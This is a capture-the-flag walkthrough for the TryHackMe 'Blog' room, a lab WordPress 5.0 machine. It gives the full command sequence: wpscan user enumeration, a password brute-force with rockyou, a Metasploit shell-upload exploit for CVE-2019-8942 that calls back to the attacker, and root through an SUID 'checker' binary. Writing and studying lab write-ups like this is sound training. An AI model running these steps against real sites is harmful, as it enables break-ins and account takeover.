## Intro

___

[Blog](http://tryhackme.com/room/blog), a CTF room based around exploiting a WordPress blog!

We'll start by adding the machine's ip address to our hosts file.

``` bash
echo target-ip blog.thm >> /etc/hosts
```

And then move on to some reconnaissance.

## Recon

___

### Information Gathering

First we'll run an nmap scan of the target, using nmap's "default" scripts (-sC) and version scanner (-sV).

``` bash
nmap -sC -sV -T4 blog.thm
```

``` bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-05 02:16 EST

```

Thanks to the version scan, we've found the answers to two questions already:

> What CMS is Billy using?  
> *WordPress*  

> What version of the above CMS was being used?  
> *5.0*

Now that we know what version of WordPress is running, we can search for known vulnerabilities.
If we search the CVE database for "WordPress 5.x" it'll be the first result!

- [CVE-2019-8942](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942)  

And the exploit-db page for the vulnerability.

- [exploit-db](https://www.exploit-db.com/exploits/46662)

We'll need an account with author access for the exploit, so next we'll use a tool called WPScan to scan the blog for possible usernames.

``` bash
wpscan --url http://blog.thm --enumerate u
```

``` bash

We've found a couple of author accounts: "bjoel" and "kwheel", next we'll run the tool again in password cracking mode.

Billy's password isn't crackable with the rockyou ( or any other) wordlist, so we'll try his mom's account.

``` bash
wpscan --url blog.thm -U kwheel -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 64 

```

About a minute and a half later, we should have Kelly's password.

## User.txt

### Exploitation

The [exploit](https://www.exploit-db.com/exploits/46662) we found earlier is actually a Metasploit module so we'll open the Metasploit console with:

``` bash
msfconsole -q
```

The module is called "Crop-image Shell Upload", we can find it by searching for "crop-image"

``` bash
search crop-image
use 0
```

Before we can use the exploit, we have to set the USERNAME, PASSWORD, RHOST, and LHOST options. Once those are set, we can run the module.

``` bash
set USERNAME kwheel
set PASSWORD *********
set RHOST blog.thm
set LHOST your-ip

exploit
```

When the epxloit has finished, we can start our shell with:


``` bash
shell
script -qc /bin/bash /dev/null
```

Now that we've started our shell we can search for the user flag.

``` bash
find / -name user.txt 2>/dev/null
/home/bjoel/user.txt

cat /home/bjoel/user.txt
You won't find what you're looking for here.

TRY HARDER
```

Hmmm, that didn't work. Let's try escalating to root to find the real user flag.

## Root.txt

___

### Privilege Escalation

We'll start off searching for applications with an suid set.

``` bash
find / -type f -perm -04000 2>/dev/null

/usr/sbin/checker
```

We find a bit of an odd one in "/usr/sbin/checker", let's run it and see what happens.

``` bash
checker

Not an Admin
```

Not much info there; we'll run it through a program called "ltrace", which runs the command until right before completion, tracing its library calls.


``` bash
ltrace /usr/sbin/checker

getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin)                 = 13
+++ exited (status 0) +++

```

It seems checker checks an environment variable (admin) and if it doesn't exist (returns nil) prints "Not an Admin"

We'll try to set the admin variable to something before running the command again.

``` bash
export admin="kcalb"
checker
```

(You can set admin to anything, the program only checks that it exists.)

``` bash
whoami
root
```
Success! Now that we have root access we'll run another search for the user flag.

``` bash
find / -name user.txt 2>/dev/null
/media/usb/user.txt

cat /media/usb/user.txt
```
That also answers the last question.

> Where was user.txt found?  
> */media/usb*

Lastly, we'll search for and print out the root flag.

``` bash
find / -name root.txt 2>/dev/null
/root/root.txt

cat /root/root.txt
```

## Success!

___

That's it! We've captured both Blog flags!
